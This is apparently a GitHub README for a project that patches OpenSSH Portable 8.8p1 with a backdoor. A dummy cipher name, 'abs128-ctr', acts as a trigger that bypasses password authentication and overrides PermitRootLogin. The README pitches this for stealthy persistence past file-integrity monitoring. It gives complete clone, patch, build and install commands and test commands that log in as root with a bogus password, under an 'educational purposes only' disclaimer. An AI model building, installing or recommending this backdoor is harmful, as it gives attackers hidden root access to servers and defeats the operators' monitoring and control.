# openssh-backdoor
Experimental backdoor for OpenSSH Portable. Patch for OpenSSH Portable v8.8_p1. For educational/ethical purposes only!

## Why?

Consider using this method when you want persistence, but:

 - FIM is monitoring configuration files, but not binaries
 - You don't want to create a new backdoor user 
 - You don't want to deploy a reverse shell

## How does it work?

This repo contains a patch for OpenSSH (server and client) to allow for a complete authentication bypass without modifying configuration files on the target server, adding new users, overwriting credentials, or deploying an implant such as a reverse shell. 

The patch creates a dummy cipher suite, in this case `abs128-ctr` that functions as an activation phrase. Any client that sends this dummy cipher spec during the SSH [algorithm negotiation](https://datatracker.ietf.org/doc/html/rfc4253#section-7.1) will completely bypass PASSWD authentication on the patched server. Clients connecting with normal cipher specs will authenticate as normal.

Additionally, the patch overrides `PermitRootLogin`, allowing clients sending the activation phrase to login as root regardless of the OpenSSH server's restriction. 

## Installation and Patching 

The following commands when issued will patch OpenSSH and produce a modified ssh client in `/tmp/ssh` and a modified server binary in `/usr/local/sbin/sshd`. 

```
wget https://github.com/openssh/openssh-portable/archive/refs/tags/V_8_8_P1.tar.gz
gunzip V_8_8_P1.tar.gz
tar xvf V_8_8_P1.tar
git clone https://github.com/Psmths/openssh-backdoor
cp ./openssh-backdoor/*.patch ./openssh-portable-V_8_8_P1/
cd openssh-portable-V_8_8_P1/
patch -u auth-passwd.c -i auth-passwd.c.patch
patch -u auth.c -i auth.c.patch
patch -u cipher.c -i cipher.c.patch 
patch -u kex.c -i kex.c.patch
patch -u kex.h -i kex.h.patch
patch -u packet.h -i packet.h.patch
patch -u servconf.c -i servconf.c.patch
autoreconf
./configure --bindir=/tmp/
make -j 24
sudo make install
```

To test, run the modified server binary and set it to listen on some port:

```
sudo /usr/local/sbin/sshd -p 9001
```

Attempt to authenticate without the special cipher suite string, and a bogus password. This should fail.
```
/tmp/ssh root@127.0.0.1 -p 9001 -c "chacha20-poly1305@openssh.com"
```

Attempt to authenticate with the special cipher suite string, in this case `abs128-ctr`, and a bogus password. This should seccessfully authenticate you as root.
```
/tmp/ssh root@127.0.0.1 -p 9001 -c "abs128-ctr,chacha20-poly1305@openssh.com"
```
